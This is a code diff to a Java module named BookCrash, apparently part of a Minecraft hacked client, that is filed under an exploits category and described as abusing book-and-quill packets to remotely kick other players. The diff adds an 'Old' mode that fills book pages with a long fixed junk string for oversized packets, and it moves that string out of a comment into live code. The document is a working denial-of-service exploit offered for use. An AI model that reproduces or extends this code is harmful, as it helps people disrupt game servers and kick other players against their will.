@@ -30,7 +30,7 @@ public class BookCrash extends Module {
         super("BookCrash", -1, Category.EXPLOITS, "Abuses book and quill packets to remotely kick people.",
                 new SettingSlider("Uses: ",1, 20, 5, 0),
                 new SettingSlider("Delay: ", 0, 5, 0, 0),
-                new SettingMode("Mode: ", "Ascii", "Fill", "Random"),
+                new SettingMode("Mode: ", "Ascii", "Fill", "Random", "Old"),
                 new SettingSlider("Pages: ", 1,100,50,0),
                 new SettingSlider("Chars per Page: ", 1,210,210,0));
     }
@@ -62,10 +62,11 @@ public class BookCrash extends Module {
         }else if (getSettings().get(2).toMode().mode == 0) {
             IntStream chars = new Random().ints(0x20, 0x7E);
             size = chars.limit(pageChars*pages).mapToObj(i -> String.valueOf((char) i)).collect(Collectors.joining());
+        }else if (getSettings().get(2).toMode().mode == 3) {
+            size = "wveb54yn4y6y6hy6hb54yb5436by5346y3b4yb343yb453by45b34y5by34yb543yb54y5 h3y4h97,i567yb64t5vr2c43rc434v432tvt4tvybn4n6n57u6u57m6m6678mi68,867,79o,o97o,978iun7yb65453v4tyv34t4t3c2cc423rc334tcvtvt43tv45tvt5t5v43tv5345tv43tv5355vt5t3tv5t533v5t45tv43vt4355t54fwveb54yn4y6y6hy6hb54yb5436by5346y3b4yb343yb453by45b34y5by34yb543yb54y5 h3y4h97,i567yb64t5vr2c43rc434v432tvt4tvybn4n6n57u6u57m6m6678mi68,867,79o,o97o,978iun7yb65453v4tyv34t4t3c2cc423rc334tcvtvt43tv45tvt5t5v43tv5345tv43tv5355vt5t3tv5t533v5t45tv43vt4355t54fwveb54yn4y6y6hy6hb54yb5436by5346y3b4yb343yb453by45b34y5by34yb543yb54y5 h3y4h97,i567yb64t5";
+
         }
-
-        //String size = "wveb54yn4y6y6hy6hb54yb5436by5346y3b4yb343yb453by45b34y5by34yb543yb54y5 h3y4h97,i567yb64t5vr2c43rc434v432tvt4tvybn4n6n57u6u57m6m6678mi68,867,79o,o97o,978iun7yb65453v4tyv34t4t3c2cc423rc334tcvtvt43tv45tvt5t5v43tv5345tv43tv5355vt5t3tv5t533v5t45tv43vt4355t54fwveb54yn4y6y6hy6hb54yb5436by5346y3b4yb343yb453by45b34y5by34yb543yb54y5 h3y4h97,i567yb64t5vr2c43rc434v432tvt4tvybn4n6n57u6u57m6m6678mi68,867,79o,o97o,978iun7yb65453v4tyv34t4t3c2cc423rc334tcvtvt43tv45tvt5t5v43tv5345tv43tv5355vt5t3tv5t533v5t45tv43vt4355t54fwveb54yn4y6y6hy6hb54yb5436by5346y3b4yb343yb453by45b34y5by34yb543yb54y5 h3y4h97,i567yb64t5";
-
+        
         for (int i = 0; i < 50; i++) {
             String siteContent = size;
             StringTag tString = new StringTag(siteContent);
